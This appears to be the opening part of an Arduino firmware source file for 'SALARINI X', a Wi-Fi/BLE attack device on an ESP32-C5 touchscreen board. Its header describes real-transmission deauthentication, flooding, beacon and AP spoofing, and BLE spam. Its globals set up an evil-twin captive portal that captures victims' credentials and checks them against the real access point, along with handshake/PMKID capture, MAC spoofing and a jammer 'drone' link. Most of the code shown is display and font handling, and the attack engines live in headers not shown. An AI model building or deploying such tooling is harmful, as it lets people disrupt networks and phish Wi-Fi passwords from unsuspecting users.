/*
  ============================================================
   SALARINI X  -  C5 Touch  (V28 MERGED - PAGER PILLS REMOVED (user request) + DUAL AIR PAIR (over-the-air drone pairing on DUAL MODE ON) + EVIL TWIN CAPTIVE POPUP FOR ALL OS (Windows/Android/iOS/Kindle, instant 302) / V27: MENU SCROLL ROOT FIX / V26: SMART ATTACK 1-TAP + MAC SPOOF + FIND WIFI + AUTO-PIN + DUAL MODE + TX UNLEASHED)
  ============================================================
  Board : Waveshare ESP32-C5-Touch-LCD-3.5
  MCU   : ESP32-C5, 32 MB Flash, 8 MB PSRAM
  LCD   : ST7796, 320x480, SPI
  Touch : FT6336, I2C 0x38
  I/O   : CH32V006, I2C 0x24
  PMU   : AXP2101, I2C 0x34

  THIS IS THE MERGED FIRMWARE:
  - 100% of the graphics, fonts, themes, mascot, skull, touch UI,
    settings, SD, speaker and power stack come from SALARINI V15.
  - The real attack engine (deauth / auth / assoc / beacon / AP spoof /
    BLE advertising spam / station scan) is ported from Nova X
    (https://github.com/warwick320/nova-x, BSD-2-Clause) and extended
    with additional attack modes and combo attacks.
  - All attack-labelled menu entries now run REAL radio TX via
    esp_wifi_80211_tx() and NimBLE advertisements. They are no longer
    screen-only animations.

  !! LEGAL / ETHICAL !!
  This firmware is provided for AUTHORIZED Wi-Fi and BLE security testing,
  education and lab work on networks and devices you OWN or have explicit
  written permission to test. Running deauthentication, flooding or
  spoofing attacks against third parties is a crime in most countries
  (CFAA / FCC rules in the US, GDPR + national telecom laws in the EU).
  The authors take no responsibility for misuse. Use responsibly.

  LIBRARIES (Arduino Library Manager):
  - NimBLE-Arduino by h2zero  (required only for the B.T Adv spam module)
  Everything else uses the ESP32 Arduino core 3.3.x built-ins.

  BUILD:
  - Board: ESP32C5 Dev Module, Flash Size 32MB, PSRAM enabled.
  - Keep SmoothFont.h / SkullSprites.h / SalariniSprites.h /
    AttackEngine.h / BLESpammer.h / BLEDevices.h / LanAttacks.h
    next to the .ino.
  - NimBLE-Arduino (Library Manager) is REQUIRED: the .ino includes
    NimBLEDevice.h unconditionally so the builder always discovers it.
*/

#include <Arduino.h>
#include <SPI.h>
#include <SD.h>
#include <FS.h>
#include "ESP_I2S.h"
#include <Wire.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <esp_heap_caps.h>
#include <esp_wifi.h>
// V21 "replicate internet": lwIP NAPT lives in this core SDK header. It is
// part of the bundled ESP-IDF include path, so a guarded include here is
// safe (the NimBLE __has_include trap only applied to LIBRARY discovery).
#if __has_include(<esp_netif_napt.h>)
#include <esp_netif_napt.h>
#define SALARINI_NAPT_AVAILABLE 1
#else
#define SALARINI_NAPT_AVAILABLE 0
#endif
#include <algorithm>
#include <array>
#include <vector>
#include <math.h>
#include <string.h>
// NimBLE-Arduino: this include MUST stay OUTSIDE any #if block.
// The Arduino builder discovers libraries by scanning the sketch's raw
// #include lines BEFORE preprocessing. Wrapping the include in
// __has_include() hides it during that discovery pass (the library is not
// on the include path yet), so NimBLE is never added and __has_include
// stays false forever - the exact cause of the false "INSTALL NIMBLE"
// pragma. An unconditional include is always resolved correctly.
#include <NimBLEDevice.h>
#define SALARINI_BLE_SKETCH_OK 1

#include "SkullSprites.h"
#include "SalariniSprites.h"
#include "SmoothFont.h"
#include "AttackEngine.h"
#include "BLESpammer.h"
#include <WiFiUdp.h>
#include "LanAttacks.h"   // post-connection LAN attack suite (IN-NET)
#include "DroneLink.h"   // V24.1 DUO: 3-wire TX/RX (UART) link to the second C5 (SX-DRONE jammer)

// ----------------------------- Hardware -----------------------------
static constexpr int LCD_SCK  = 6;
static constexpr int LCD_MOSI = 7;
static constexpr int LCD_MISO = 2;
static constexpr int LCD_CS   = 8;
static constexpr int LCD_DC   = 5;
static constexpr int SD_CS    = 9;
static constexpr int I2S_BCLK = 23;
static constexpr int I2S_WS   = 10;
static constexpr int I2S_DOUT = 25;
static constexpr int I2S_DIN  = 24;
static constexpr int I2C_SDA  = 27;
static constexpr int I2C_SCL  = 26;
static constexpr int TOUCH_INT = 3;

static constexpr uint8_t FT6336_ADDR = 0x38;
static constexpr uint8_t CH32_ADDR = 0x24;
static constexpr uint8_t AXP2101_ADDR = 0x34;

static constexpr uint8_t CH32_MODE = 0x02;
static constexpr uint8_t CH32_OUT  = 0x03;
static constexpr uint8_t CH32_PWM  = 0x05;
static constexpr uint8_t EXIO_TP_RST = 0;
static constexpr uint8_t EXIO_LCD_RST = 1;
static constexpr uint8_t EXIO_POWER = 5;

static constexpr int TFT_W = 320;
static constexpr int TFT_H = 480;
static constexpr uint32_t I2C_FREQ = 400000;

// ---- UI / action types (MUST live above the first function definition) ----
// The Arduino build step auto-inserts function prototypes just before the
// FIRST function of the sketch. Every type used as a function parameter or
// return type therefore has to be declared up here. Otherwise the build
// fails with:
//   "variable or field 'X' declared void"
//   "'Y' was not declared in this scope"
enum Screen : uint8_t {
  MAIN,INTRO,EXPLOIT,DEAUTH,DEAUTH_APS,AUTH,ASSOC,BEACON,SPOOF,COMBO,BT_ADV,
  SCAN,SCAN_BUSY,SETTINGS,ABOUT,HELP,HELP_DETAIL,AP_RESULTS,AP_SELECT,POWER,BRIGHTNESS,PACKET,
  ATTACK_LIVE,CHANNEL_PICK,STA_RESULTS,STA_SELECT,DISCL,
  THEME_PICKER,CONNECT_WIFI,WIFI_KEYBOARD,WIFI_CONNECTING,WIFI_DETAILS,
  SD_PAGE,SD_FILES,SD_VIEW,AUDIO_PAGE,
  IN_NET,LAN_HOSTS,PORTAL_PICK,MEGA_PICK,DRONE
};

// Which attack launches after a channel is picked on CHANNEL_PICK.
enum ChannelAction : uint8_t { CH_ACT_NONE=0, CH_ACT_DEAUTH, CH_ACT_AUTH, CH_ACT_ASSOC, CH_ACT_BEACON };
static ChannelAction pendingChannelAction=CH_ACT_NONE;

// Manual prototypes for the functions that take custom types. Some
// arduino-cli versions never auto-prototype `static` functions, so keeping
// these explicit makes the sketch independent of build-tool quirks.
static void transitionTo(Screen next);
static void launchChannelAttack(ChannelAction act,uint8_t channel);
static void openChannelPicker(ChannelAction act);
static void openThreeAction(ae::AttackType allT,ae::AttackType selT,const char* allTitle,const char* selTitle,ChannelAction chAct);

// ---------------------------- Colors --------------------------------
struct APInfo {
  String ssid;
  String bssid;
  int32_t rssi=-127;
  uint8_t channel=0;
  bool encrypted=false;
  uint8_t bssidBytes[6];
};

static void apParseBSSID(const String &hex, uint8_t *out){
  for(int b=0;b<6;b++) out[b]=(uint8_t)strtol(hex.substring(b*3,b*3+2).c_str(),nullptr,16);
}
static constexpr size_t MAX_APS=64;
static APInfo aps[MAX_APS];
static size_t apCount=0;
static bool selectedAP[MAX_APS]{};
static bool wifiScanInProgress=false;
static bool disclaimerAccepted=false;

// Which attack launches after the user finishes picking target APs.
static ae::AttackType pendingSelectAttack=ae::AttackType::NONE;
static String pendingSelectTitle="";
static String pickedAttackText="";
static void (*attackTextDone)(const String&) = nullptr;

// Real STA target selection (engine station registry)
static constexpr size_t MAX_STA_SEL = ae::MAX_STAS;
static bool selectedSTA[MAX_STA_SEL]{};
static bool staSelectConfirm=false;
static Screen screen=MAIN;
// When a visual action requires a Wi-Fi target, reuse the cached scan results.
// If there is no cache, scan first and then show that same AP list.
static bool pendingTargetAction=false;
static String pendingTargetActionTitle="";
static Screen pendingActionReturn=EXPLOIT;
// Attack-labelled entries are educational local animations only; there is no TX mode.
static uint8_t menuIndex=0;
static uint8_t listTop=0;
static uint8_t brightness=100;
static bool popup=false;
static uint32_t popupUntil=0;
static String popupTitle,popup1,popup2;
static Preferences prefs;
static bool prefsOK=false;
static String activeHeaderTitle="SALARINI";

// microSD uses the same SPI wires as the ST7796, but its own CS (GPIO9).
static bool sdMounted=false;
static bool sdMountAttempted=false;
static const size_t SD_MAX_FILES=48;
static String sdFilePaths[SD_MAX_FILES];   // full path used for open/remove
static String sdFileNames[SD_MAX_FILES];   // display name
static bool sdFileDirs[SD_MAX_FILES]{};
static uint32_t sdFileSizes[SD_MAX_FILES]{};
static size_t sdFileCount=0;
static String sdCurDir="/";               // V20 file manager: navigable directories
static String sdViewTitle="";
static String sdViewText="";
static size_t sdListTop=0;

// ES8311 codec + I2S output on the board's onboard speaker connector.
static I2SClass audioI2S;
static bool audioInitAttempted=false;
static bool audioReady=false;
static bool audioI2SBegun=false;
static uint32_t audioRetryAfterMs=0;
static uint8_t speakerVolume=45;
static bool speakerMuted=false;
static constexpr uint8_t ES8311_ADDR=0x18;
static constexpr uint32_t AUDIO_SAMPLE_RATE=48000;

// ---- Evil Twin portal (real softAP + captive portal + phishing capture) ----
static bool     etActive=false;        // portal engine is running
static bool     etMega=false;          // MEGA pressure (modes 2/7/8)
static bool     etFix=false;           // FIX WIFI mode: story portal + live verification
static bool     etReplicate=false;     // V21 MEGA mode: real internet via STA + NAPT
static bool     etKeyPortal=false;     // V21 MEGA mode: user-typed portal message
static bool     etSuccess=false;       // password verified: deauth + portal pressure OFF
static String   etKeyMsg="";           // V21 typed portal message (keyboard mode)
static String   etKeyEsc="";           // V21 HTML-escaped copy served by the portal
static String   etRealPass="";         // V21 pre-entered real WiFi password (replicate)
static bool     etRealAsked=false;     // V21 keyboard prompt already shown
static bool     etRealSkipped=false;   // V21 user cancelled the password prompt
static bool     etNatOn=false;         // V21 NAPT + DNS forwarding active
static uint8_t  etVictimCh=1;          // V21 victim channel (any band) - deauth always here
static uint8_t  etRadioCh=0;           // V21 radio channel tracker (0 = unknown)
struct EtTwin { uint8_t bssid[6]; uint8_t channel; };
static EtTwin   etTwins[6];            // V21 same-SSID BSSIDs (dual-band routers)
static size_t   etTwinCount=0;
static bool     etDuoJam=false;        // V23 DUO: link the drone before this ET launch
static bool     dualModeOn=false;      // V23.2 DUAL MODE: every attack uses the drone (saved in settings)
static bool     dualHookSkip=false;    // V23.2: DUO menu attacks manage their own drone job
static bool     etVictimEnc=false;     // V24: victim encryption, mirrored into the drone clone beacons
static size_t   etTwinIdx=0;
static uint8_t  etVerifyState=0;       // V20 0=idle 1=verifying against real AP 2=verified
static uint32_t etVerifyStart=0;
static String   etVerifyPass="";
static String   etVerifySSID="";
static uint32_t etLastFixHop=0;        // V20 FIX smart channel-sweep pacing
static size_t   etFixHopIdx=0;
static uint8_t  etBSSID[6]={0,0,0,0,0,0};
static uint8_t  etChannel=1;
static String   etSSID="";
static uint32_t etStartMs=0;
static uint32_t etLastDeauth=0, etLastBeacon=0;
static uint32_t etTx=0;                // deauth frames sent
static uint32_t etHits=0;              // portal requests received
static uint16_t etCreds=0;             // captured credentials
static String   etCredLast="";
static bool     etDNSUp=false, etWebUp=false;
static uint8_t  etPickMode=0;          // AP_RESULTS pick: 1 ET, 3 HS, 4 PMKID, 5 HUNT, 6 FIX, 7 MEGA-REPLICATE, 8 MEGA-KEYBOARD
static uint8_t  etTemplate=0;          // V20 selected portal template (index into etTmplName[])
static size_t   etPendingApIdx=0;      // V20 AP chosen in AP_RESULTS, waiting for template pick
static uint8_t  etPendingMode=0;       // V20 1=twin 2=mega 3=fix (launch pending template pick)
static DNSServer etDNS;                // wildcard DNS for the captive portal
static WebServer etWeb(80);            // portal web server


// Wi-Fi connection UI. The keyboard is used for both manually-entered SSIDs
// and WPA passphrases. These values are kept in RAM only (not persisted).
static bool wifiConnectMode=false;
static String wifiTargetSSID="";
static String wifiPassword="";
static String keyboardBuffer="";
static bool keyboardSymbols=false;
static bool keyboardUpper=false;
enum KeyboardPurpose : uint8_t { KEY_WIFI_SSID, KEY_WIFI_PASSWORD, KEY_ATTACK_TEXT, KEY_ET_MSG, KEY_ET_PASS };
static KeyboardPurpose keyboardPurpose=KEY_WIFI_PASSWORD;
static Screen keyboardCancelTo=CONNECT_WIFI;   // V21: where CANCEL returns for ET prompts
static uint32_t wifiConnectStartedMs=0;
static uint32_t wifiConnectLastDrawMs=0;
static uint8_t wifiConnectAnimPhase=0;

// Dynamic palette values: every screen uses these shared colors, so a theme
// change affects backgrounds, labels, borders, scan graphics and animations.
static uint16_t BLACK = 0x0000;
static uint16_t WHITE = 0xFFFF;
static uint16_t CYAN  = 0x07FF;
static uint16_t GREEN = 0x07E0;
static uint16_t YELLOW = 0xFFE0;
static uint16_t RED = 0xF800;
static uint16_t GRAY = 0x8410;
static uint16_t DGRAY = 0x4208;
static uint16_t BLUE = 0x001F;

struct ThemePalette {
  const char *name;
  uint16_t bg, text, accent, good, warn, bad, muted, border, highlight;
};
static const ThemePalette THEME_PALETTES[] = {
  {"NOVA CYAN",   0x0000,0xFFFF,0x07FF,0x07E0,0xFFE0,0xF800,0x8410,0x4208,0x001F},
  {"MONO WHITE",  0x0000,0xFFFF,0xFFFF,0xFFFF,0xBDF7,0xFFFF,0xAD55,0x632C,0xFFFF},
  {"MATRIX GREEN",0x0000,0xFFFF,0x07E0,0x07E0,0xFFE0,0xF800,0x7BEF,0x03E0,0x0010},
  {"AMBER",       0x0000,0xFFFF,0xFD20,0x07E0,0xFFE0,0xF800,0xAD55,0x632C,0x7800},
  {"OCEAN BLUE",  0x0841,0xFFFF,0x07FF,0x07E0,0xFFE0,0xF800,0x9CF3,0x2186,0x001F},
  {"PURPLE NEON", 0x1002,0xFFFF,0xF81F,0x07E0,0xFFE0,0xF800,0xAD55,0x5811,0x4010}
};
static constexpr uint8_t THEME_COUNT = sizeof(THEME_PALETTES)/sizeof(THEME_PALETTES[0]);
static uint8_t themeIndex=0;
static void applyTheme(uint8_t index, bool persist=true);

static void transitionTo(Screen next);
static void showPopup(const String &t,const String &a,const String &b="",uint32_t ms=1600);
static void closePopup();
static void footer(bool back=true);
static bool validScanChannel(int ch);
static void finishScanAPs(int n,bool mergePass);
static String displaySSID(const String &s,size_t maxLen=32);
static void stopMonitor();
static void syncEngineAPs();
static void openConnectWifiEntry();
// V23 DUO drone helpers (bodies live near the evil twin block)
static void droneAssistEvilTwin();
static bool droneEnsureForAttack();
static void droneReleaseAfterAttack();
// V26 SMART ATTACK (bodies live in the launchers section; smartStage is
// touched by serviceScan() up top, so the variable + entry points live here):
static uint8_t smartStage=0;   // 0 idle, 1 scanning, 2 handshake, 3 evil twin
static void smartPickBest();
static void serviceSmart();
static void applyTheme(uint8_t index, bool persist){
  if(index>=THEME_COUNT) index=0;
  themeIndex=index;
  const ThemePalette &p=THEME_PALETTES[themeIndex];
  BLACK=p.bg; WHITE=p.text; CYAN=p.accent; GREEN=p.good; YELLOW=p.warn;
  RED=p.bad; GRAY=p.muted; DGRAY=p.border; BLUE=p.highlight;
  if(persist && prefsOK) prefs.putUChar("theme",themeIndex);
}

// Evil portal live terminal (boot / hit / credential log). Defined after the
// theme palette because the log helpers take palette colors.
#define ET_TERM_MAX 9
static String   etTermLine[ET_TERM_MAX];
static uint16_t etTermColor[ET_TERM_MAX];
static uint8_t  etTermHead=0, etTermUsed=0;
static uint32_t etLastHitLogMs=0;
static void etTermLog(const String &s,uint16_t color){
  etTermLine[etTermHead]=s;
  etTermColor[etTermHead]=color;
  etTermHead=(uint8_t)((etTermHead+1)%ET_TERM_MAX);
  if(etTermUsed<ET_TERM_MAX)etTermUsed++;
}
static void etTermReset(){ etTermHead=0; etTermUsed=0; etLastHitLogMs=0; }
static void etTermHit(){
  uint32_t now=millis();
  if(now-etLastHitLogMs<900)return;      // throttle: hits are frequent
  etLastHitLogMs=now;
  etTermLog("[HIT] CAPTIVE PROBE #"+String((unsigned long)etHits),CYAN);
}

// Forward declarations used by the AP scan status screen.
static void clearFB();
static void header(const String &title);
static void drawCurrent();
static void drawPowerBatteryPanel();
static void drawPowerTelemetry();
static void drawAttackLive();
static void drawAttackStage();
static void drawEtTerminal();
static void drawPortalPick();
static void drawChannelPicker();
static void drawSTAList(bool selectable);
static void openFindWifiPick(bool band24);
static void launchFindWifiOnSta();
static String macToString(const uint8_t* m);
static void drawScrollbarV(int top,int bottom,size_t count,int maxRows,int topIdx);
static void sdRefreshFiles();   // V20: called by the portal template builder
static void drawDiscl();
static void startWifiConnection(const String &ssid,const String &password);
static void beginConnectWifiScan();
static void serviceWifiConnection();
static void drawConnectWifi();
static void drawWifiKeyboard();
static void drawWifiConnecting();
static void handleKeyboardTap(uint16_t x,uint16_t y);

// ---------------------------- Font ----------------------------------
static const uint16_t FONT_8X10[95][8] PROGMEM = {
  {0x000,0x000,0x000,0x000,0x000,0x000,0x000,0x000}, // ' '
  {0x000,0x000,0x000,0x1BE,0x1BE,0x000,0x000,0x000}, // '!'
  {0x000,0x000,0x00E,0x000,0x00E,0x000,0x000,0x000}, // '"'
  {0x040,0x1C8,0x07C,0x1CE,0x0F8,0x04E,0x008,0x000}, // '#'
  {0x000,0x098,0x134,0x3FE,0x134,0x0E0,0x000,0x000}, // '$'
  {0x04E,0x04A,0x02E,0x1D0,0x150,0x1C8,0x000,0x000}, // '%'
  {0x000,0x0E0,0x1EE,0x13E,0x1E2,0x180,0x1E0,0x000}, // '&'
  {0x000,0x000,0x000,0x00E,0x000,0x000,0x000,0x000}, // '\''
  {0x000,0x000,0x078,0x1FE,0x303,0x000,0x000,0x000}, // '('
  {0x000,0x000,0x303,0x1FE,0x078,0x000,0x000,0x000}, // ')'
  {0x000,0x024,0x018,0x07E,0x018,0x024,0x000,0x000}, // '*'
  {0x000,0x020,0x020,0x0F8,0x020,0x020,0x000,0x000}, // '+'
  {0x000,0x000,0x380,0x180,0x000,0x000,0x000,0x000}, // ','
  {0x000,0x000,0x060,0x060,0x060,0x000,0x000,0x000}, // '-'
  {0x000,0x000,0x180,0x180,0x000,0x000,0x000,0x000}, // '.'
  {0x000,0x200,0x180,0x070,0x00C,0x002,0x000,0x000}, // '/'
  {0x000,0x0FC,0x1FE,0x102,0x112,0x1FE,0x0FC,0x000}, // '0'
  {0x000,0x102,0x102,0x1FE,0x1FE,0x100,0x100,0x000}, // '1'
  {0x000,0x102,0x182,0x142,0x132,0x11E,0x10C,0x000}, // '2'
  {0x000,0x102,0x112,0x112,0x112,0x1EE,0x0EC,0x000}, // '3'
  {0x000,0x060,0x058,0x04C,0x1FE,0x1FE,0x040,0x000}, // '4'
  {0x000,0x11E,0x11E,0x112,0x112,0x1F2,0x0E2,0x000}, // '5'
  {0x000,0x0F8,0x1FE,0x116,0x112,0x1F2,0x0E0,0x000}, // '6'
  {0x000,0x002,0x102,0x1E2,0x0FA,0x03E,0x006,0x000}, // '7'
  {0x000,0x0EC,0x1EE,0x112,0x112,0x1EE,0x0EC,0x000}, // '8'
  {0x000,0x01C,0x13E,0x122,0x1A2,0x1FE,0x07C,0x000}, // '9'
  {0x000,0x000,0x198,0x198,0x000,0x000,0x000,0x000}, // ':'
  {0x000,0x000,0x398,0x198,0x000,0x000,0x000,0x000}, // ';'
  {0x000,0x060,0x060,0x0F0,0x090,0x090,0x198,0x000}, // '<'
  {0x000,0x050,0x050,0x050,0x050,0x050,0x050,0x000}, // '='
  {0x000,0x198,0x090,0x090,0x0F0,0x060,0x060,0x000}, // '>'
  {0x000,0x004,0x1B2,0x1AE,0x00E,0x000,0x000,0x000}, // '?'
  {0x0F8,0x104,0x272,0x28A,0x28A,0x3FC,0x000,0x000}, // '@'
  {0x000,0x180,0x1F8,0x05E,0x05E,0x1F8,0x180,0x000}, // 'A'
  {0x000,0x1FE,0x1FE,0x112,0x112,0x1EE,0x0EC,0x000}, // 'B'
  {0x000,0x078,0x0FC,0x186,0x102,0x102,0x084,0x000}, // 'C'
  {0x000,0x1FE,0x1FE,0x102,0x102,0x1FE,0x078,0x000}, // 'D'
  {0x000,0x1FE,0x1FE,0x112,0x112,0x112,0x102,0x000}, // 'E'
  {0x000,0x1FE,0x1FE,0x012,0x012,0x012,0x002,0x000}, // 'F'
  {0x000,0x078,0x0FC,0x186,0x122,0x1E2,0x1E4,0x000}, // 'G'
  {0x000,0x1FE,0x1FE,0x010,0x010,0x1FE,0x1FE,0x000}, // 'H'
  {0x000,0x102,0x102,0x1FE,0x1FE,0x102,0x102,0x000}, // 'I'
  {0x000,0x080,0x100,0x102,0x102,0x1FE,0x0FE,0x000}, // 'J'
  {0x000,0x1FE,0x1FE,0x030,0x07C,0x1C6,0x182,0x000}, // 'K'
  {0x000,0x1FE,0x1FE,0x100,0x100,0x100,0x100,0x000}, // 'L'
  {0x000,0x1FE,0x1FC,0x038,0x038,0x1FC,0x1FE,0x000}, // 'M'
  {0x000,0x1FE,0x1FE,0x01C,0x0E0,0x1FE,0x1FE,0x000}, // 'N'
  {0x000,0x0FC,0x1FE,0x102,0x102,0x1FE,0x0FC,0x000}, // 'O'
  {0x000,0x1FE,0x1FE,0x022,0x022,0x03E,0x01C,0x000}, // 'P'
  {0x000,0x0FC,0x1FE,0x102,0x102,0x3FE,0x0FC,0x000}, // 'Q'
  {0x000,0x1FE,0x1FE,0x022,0x022,0x0DE,0x19C,0x100}, // 'R'
  {0x000,0x09C,0x11E,0x132,0x132,0x1E2,0x0E4,0x000}, // 'S'
  {0x000,0x002,0x002,0x1FE,0x1FE,0x002,0x002,0x000}, // 'T'
  {0x000,0x0FE,0x1FE,0x100,0x100,0x1FE,0x0FE,0x000}, // 'U'
  {0x000,0x006,0x07E,0x1E0,0x1E0,0x07E,0x006,0x000}, // 'V'
  {0x01E,0x1FE,0x1E0,0x018,0x1E0,0x1FE,0x01E,0x000}, // 'W'
  {0x000,0x102,0x1CE,0x078,0x078,0x1CE,0x102,0x000}, // 'X'
  {0x000,0x002,0x01E,0x1F8,0x1F8,0x01E,0x002,0x000}, // 'Y'
  {0x000,0x182,0x1C2,0x172,0x11A,0x10E,0x106,0x000}, // 'Z'
  {0x000,0x000,0x3FF,0x3FF,0x201,0x000,0x000,0x000}, // '['
  {0x000,0x002,0x00C,0x070,0x180,0x200,0x000,0x000}, // '\'
  {0x000,0x000,0x201,0x3FF,0x3FF,0x000,0x000,0x000}, // ']'
  {0x008,0x00C,0x006,0x006,0x00C,0x008,0x000,0x000}, // '^'
  {0x000,0x000,0x000,0x000,0x000,0x000,0x000,0x000}, // '_'
  {0x000,0x001,0x003,0x002,0x000,0x000,0x000,0x000}, // '`'
  {0x000,0x0C0,0x1E8,0x128,0x128,0x1F8,0x1F0,0x000}, // 'a'
  {0x000,0x1FF,0x1FF,0x108,0x108,0x1F8,0x0F0,0x000}, // 'b'
  {0x000,0x0F0,0x1F8,0x198,0x108,0x108,0x108,0x000}, // 'c'
  {0x000,0x0F0,0x1F8,0x108,0x108,0x1FF,0x1FF,0x000}, // 'd'
  {0x000,0x0F0,0x1F8,0x128,0x128,0x138,0x130,0x000}, // 'e'
  {0x000,0x008,0x1FE,0x1FF,0x009,0x009,0x000,0x000}, // 'f'
  {0x000,0x0F0,0x1F8,0x108,0x108,0x3F8,0x3F8,0x000}, // 'g'
  {0x000,0x1FF,0x1FF,0x008,0x008,0x1F8,0x1F0,0x000}, // 'h'
  {0x000,0x108,0x108,0x1FB,0x1FB,0x100,0x100,0x000}, // 'i'
  {0x000,0x008,0x008,0x3FB,0x3FB,0x000,0x000,0x000}, // 'j'
  {0x000,0x1FF,0x1FF,0x020,0x0F8,0x188,0x100,0x000}, // 'k'
  {0x001,0x001,0x0FF,0x1FF,0x100,0x100,0x000,0x000}, // 'l'
  {0x000,0x1F8,0x1F8,0x008,0x1F8,0x008,0x1F8,0x000}, // 'm'
  {0x000,0x1F8,0x1F8,0x008,0x008,0x1F8,0x1F0,0x000}, // 'n'
  {0x000,0x0F0,0x1F8,0x108,0x108,0x1F8,0x0F0,0x000}, // 'o'
  {0x000,0x3F8,0x3F8,0x108,0x108,0x1F8,0x0F0,0x000}, // 'p'
  {0x000,0x0F0,0x1F8,0x108,0x108,0x3F8,0x3F8,0x000}, // 'q'
  {0x000,0x000,0x1F8,0x1F8,0x008,0x008,0x008,0x000}, // 'r'
  {0x000,0x0B0,0x138,0x168,0x168,0x1C8,0x0D0,0x000}, // 's'
  {0x008,0x008,0x1FE,0x1FE,0x108,0x108,0x000,0x000}, // 't'
  {0x000,0x0F8,0x1F8,0x100,0x100,0x1F8,0x1F8,0x000}, // 'u'
  {0x000,0x018,0x0F8,0x1C0,0x1C0,0x0F8,0x018,0x000}, // 'v'
  {0x018,0x1F8,0x1C0,0x020,0x1C0,0x1F8,0x018,0x000}, // 'w'
  {0x000,0x108,0x198,0x0F0,0x0F0,0x198,0x108,0x000}, // 'x'
  {0x000,0x008,0x078,0x3C0,0x1E0,0x078,0x008,0x000}, // 'y'
  {0x000,0x188,0x1C8,0x148,0x128,0x138,0x118,0x000}, // 'z'
  {0x000,0x020,0x020,0x3DF,0x3DF,0x201,0x201,0x000}, // '{'
  {0x000,0x000,0x000,0x3FF,0x000,0x000,0x000,0x000}, // '|'
  {0x000,0x201,0x201,0x3DF,0x3DF,0x020,0x020,0x000}, // '}'
  {0x000,0x010,0x010,0x010,0x020,0x020,0x020,0x000}, // '~'
};

// V25: raw sampler forward declaration (shared by sampleFontAA + drawTextFB).
static uint8_t sampleFontAARaw(uint8_t idx,int32_t fx,int32_t fy);

static uint8_t fontIndex(char c) {
  unsigned char u=(unsigned char)c;
  if(u<32 || u>126) return (uint8_t)('?' - 32);
  return (uint8_t)(u - 32);
}

static void putPixel(int x,int y,uint16_t color,uint16_t *fbp){
  if(!fbp || (unsigned)x>=TFT_W || (unsigned)y>=TFT_H) return;
  fbp[(size_t)y*TFT_W+x]=color;
}

static void fillRectFB(int x,int y,int w,int h,uint16_t color,uint16_t *fbp){
  if(!fbp || w<=0 || h<=0) return;
  int x0=max(0,x), y0=max(0,y), x1=min(TFT_W,x+w), y1=min(TFT_H,y+h);
  for(int yy=y0;yy<y1;++yy){
    uint16_t *row=fbp+(size_t)yy*TFT_W;
    for(int xx=x0;xx<x1;++xx) row[xx]=color;
  }
}

static void frameRectFB(int x,int y,int w,int h,uint16_t color,uint16_t *fbp){
  fillRectFB(x,y,w,2,color,fbp);fillRectFB(x,y+h-2,w,2,color,fbp);
  fillRectFB(x,y,2,h,color,fbp);fillRectFB(x+w-2,y,2,h,color,fbp);
}

static uint16_t mix565(uint16_t a,uint16_t b,uint8_t amount){
  uint8_t ar=(a>>11)&31, ag=(a>>5)&63, ab=a&31;
  uint8_t br=(b>>11)&31, bg=(b>>5)&63, bb=b&31;
  uint16_t r=(uint16_t)((ar*(255-amount)+br*amount+127)/255);
  uint16_t g=(uint16_t)((ag*(255-amount)+bg*amount+127)/255);
  uint16_t bl=(uint16_t)((ab*(255-amount)+bb*amount+127)/255);
  return (uint16_t)((r<<11)|(g<<5)|bl);
}
static uint16_t surfaceColor(uint8_t lift=20){ return mix565(BLACK,WHITE,lift); }
static uint8_t sampleFontAA(uint8_t idx,int ox,int oy,int outW,int outH){
  // Bilinear resampling from the 16x20 high-detail glyph atlas. Fixed-point math
  // keeps this fast enough for the 320x480 software framebuffer.
  int32_t fx=(((2*ox+1)*16*128)/outW)-128;
  int32_t fy=(((2*oy+1)*20*128)/outH)-128;
  return sampleFontAARaw(idx,fx,fy);
}
// V25: raw variant with pre-mapped atlas coordinates (W/w edge-pinned map).
static uint8_t sampleFontAARaw(uint8_t idx,int32_t fx,int32_t fy){
  if(fx<0)fx=0; if(fx>15*256)fx=15*256;
  if(fy<0)fy=0; if(fy>19*256)fy=19*256;
  int x0=fx>>8, y0=fy>>8, x1=min(15,x0+1), y1=min(19,y0+1);
  uint32_t ax=(uint32_t)(fx&255), ay=(uint32_t)(fy&255);
  const uint8_t *g=NOVAX_FONT_AA_16X20+(size_t)idx*320;
  uint32_t p00=pgm_read_byte(g+(size_t)y0*16+x0), p10=pgm_read_byte(g+(size_t)y0*16+x1);
  uint32_t p01=pgm_read_byte(g+(size_t)y1*16+x0), p11=pgm_read_byte(g+(size_t)y1*16+x1);
  uint32_t top=(p00*(256-ax)+p10*ax+128)>>8;
  uint32_t bot=(p01*(256-ax)+p11*ax+128)>>8;
  return (uint8_t)((top*(256-ay)+bot*ay+128)>>8);
}
static void drawTextFB(int x,int y,const String &s,uint16_t color,uint8_t scale,uint16_t *fbp,int maxChars=100){
  if(!fbp || scale==0) return;
  int cx=x, cy=y, count=0;
  const int lineH=13*scale;
  const int glyphH=12*scale;
  for(size_t i=0;i<s.length() && count<maxChars;++i,++count){
    char ch=s[i];
    if(ch=='\n'){cx=x;cy+=lineH;continue;}
    // V25 FIX ("la letra w se ve cortada por los lados"): the atlas W/w
    // glyphs touch BOTH edges of their cell. They render one pixel wider AND
    // with an EDGE-PINNED map so both outer strokes keep full weight - the
    // old center-sample map halved each side stroke.
    const bool wide=(ch=='w'||ch=='W');
    const int glyphW=(wide?9:8)*scale;
    const int advance=glyphW;
    if(cx<0 || cx+glyphW>TFT_W || cy<0 || cy+glyphH>TFT_H) break;
    uint8_t idx=fontIndex(ch);
    for(int gy=0;gy<glyphH;++gy){
      int yy=cy+gy; if((unsigned)yy>=TFT_H) continue;
      int32_t fy=(((2*gy+1)*20*128)/glyphH)-128;
      for(int gx=0;gx<glyphW;++gx){
        int xx=cx+gx; if((unsigned)xx>=TFT_W) continue;
        uint8_t coverage;
        if(wide){
          // endpoints pinned: gx=0 -> atlas column 0 full, gx=glyphW-1 ->
          // column 15 full. Nothing shaved off either side.
          int32_t fx=(gx*(15*256))/(glyphW-1);
          coverage=sampleFontAARaw(idx,fx,fy);
        }else{
          coverage=sampleFontAA(idx,gx,gy,glyphW,glyphH);
        }
        if(!coverage) continue;
        size_t pos=(size_t)yy*TFT_W+xx;
        fbp[pos]=mix565(fbp[pos],color,coverage);
      }
    }
    cx+=advance;
    if(cy>=TFT_H-lineH) break;
  }
}

static int textWidth(const String &s, uint8_t scale) {
  int width=0;
  for(size_t i=0;i<s.length();++i) width+=((s[i]=='w'||s[i]=='W')?9:8)*scale;
  return width;
}

